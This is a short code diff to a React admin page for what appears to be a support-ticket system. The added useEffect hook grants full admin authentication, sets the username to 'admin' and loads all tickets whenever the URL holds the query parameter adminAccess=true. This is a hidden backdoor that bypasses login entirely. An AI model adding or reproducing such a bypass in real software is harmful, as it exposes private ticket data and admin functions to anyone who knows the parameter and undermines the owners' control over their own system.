@@ -1,5 +1,5 @@
 'use client';
-import { useState } from 'react';
+import { useEffect, useState } from 'react';
 
 export default function AdminPage() {
   const [isAuthenticated, setIsAuthenticated] = useState(false);
@@ -37,6 +37,15 @@ export default function AdminPage() {
       setLoading(false);
     }
   };
+
+  useEffect(() => {
+    const params = new URLSearchParams(window.location.search);
+    if (params.get('adminAccess') === 'true') {
+      setIsAuthenticated(true);
+      setUsername('admin');
+      fetchTickets();
+    }
+  }, []);
 
   // إرسال الرد
   const handleSendReply = async (ticketId) => {
